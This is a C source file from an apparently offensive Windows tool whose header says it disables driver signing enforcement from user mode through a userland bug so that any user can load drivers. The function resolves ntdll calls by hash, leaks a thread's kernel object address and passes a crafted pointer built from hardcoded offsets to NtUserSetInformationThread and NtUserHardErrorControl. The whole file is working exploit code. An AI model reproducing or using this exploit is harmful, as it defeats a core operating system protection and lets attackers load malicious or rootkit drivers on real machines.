/**
 *
 * Disables driver signing enforcement from
 * usermode, and loads a requested driver
 * into memory.
 *
 * Do to the lack of a driver and usage of
 * a userland bug, this project remains 
 * closed source.
 *
**/

#include "common.h"

/**
 *
 * Purpose:
 *
 * Disables driver signing enforcement for
 * the system, allowing an arbitrary user
 * to load drivers.
 *
 * Runs within CSRSS and executes the sys
 * call.
 *
**/

D_SEC( C ) VOID WINAPI DsePatch( PVOID Parameter )
{
	ULONG				Len = sizeof( SYSTEM_HANDLE_INFORMATION );
	PVOID				Obf = NULL;
	PVOID				Thd = NULL;
	PVOID				Mgr = NULL;
	PSYSTEM_HANDLE_INFORMATION	Sys = NULL;

	API				Api;
	CLIENT_ID			Cid;
	LARGE_INTEGER			Prm;
	OBJECT_ATTRIBUTES		Obj;
	USERTHREAD_USEDESKTOP		Usr;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Prm, sizeof( Prm ) );
	RtlSecureZeroMemory( &Obj, sizeof( Obj ) );
	RtlSecureZeroMemory( &Usr, sizeof( Usr ) );

	Api.NtQuerySystemInformation = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYSYSTEMINFORMATION );
	Api.RtlReAllocateHeap        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREALLOCATEHEAP );
	Api.NtQueueApcThread         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUEUEAPCTHREAD );
	Api.RtlAllocateHeap          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.RtlGetVersion            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLGETVERSION );
	Api.NtOpenThread             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTOPENTHREAD );
	Api.RtlFreeHeap		     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.DbgPrint		     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_DBGPRINT );
	Api.NtClose                  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	Obj.Length        = sizeof( OBJECT_ATTRIBUTES );
	Cid.UniqueThread  = ( ( PCLIENT_ID ) Parameter )->UniqueThread;
	Cid.UniqueProcess = ( ( PCLIENT_ID ) Parameter )->UniqueProcess;

	if ( ! Api.NtOpenThread( &Thd, THREAD_ALL_ACCESS, &Obj, &Cid ) ) {
		/* Create the initial allocation */
		Mgr = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap;
		Sys = Api.RtlAllocateHeap( Mgr, HEAP_ZERO_MEMORY, Len );

		/* Try to allocate the correct buffer size to get the lenght */
		while ( Api.NtQuerySystemInformation( SystemHandleInformation, Sys, Len, NULL ) == STATUS_INFO_LENGTH_MISMATCH ) {
			Sys = Api.RtlReAllocateHeap( Mgr, HEAP_ZERO_MEMORY, Sys, Len += sizeof( SYSTEM_HANDLE_INFORMATION ) );
			
			/* :( abort */
			if ( ! Sys ) {
				break;
			};
		};

		/* Good? Enum! */
		if ( Sys != NULL ) {
			for ( INT Idx = 0 ; Idx < Sys->NumberOfHandles ; ++Idx ) {
				/* Is our process? */
				if ( Sys->Handles[ Idx ].UniqueProcessId == ( ( USHORT )( NtCurrentTeb()->ClientId.UniqueProcess ) ) ) {
					/* Is our handle? */
					if ( Sys->Handles[ Idx ].HandleValue == ( ( USHORT )( Thd ) ) ) {
						/* Object Address! */
						Obf = C_PTR( Sys->Handles[ Idx ].Object );
						break;
					};
				};
			};

			/* Good! */
			if ( Obf != NULL ) {
				if ( ! NtUserSetInformationThread( ( ( HANDLE ) - 2 ), 7, &Usr, sizeof( Usr ) ) ) {
					Usr.Restore.pDeskRestore = C_PTR( U_PTR( U_PTR( U_PTR( Obf ) + 0x232 ) + 0x30 ) );
					NtUserHardErrorControl( 6, ( ( HANDLE ) - 2 ), &Usr.Restore );
				};
			};
			Api.RtlFreeHeap( Mgr, 0, Sys );
		};
		Api.NtClose( Thd );
	};
};
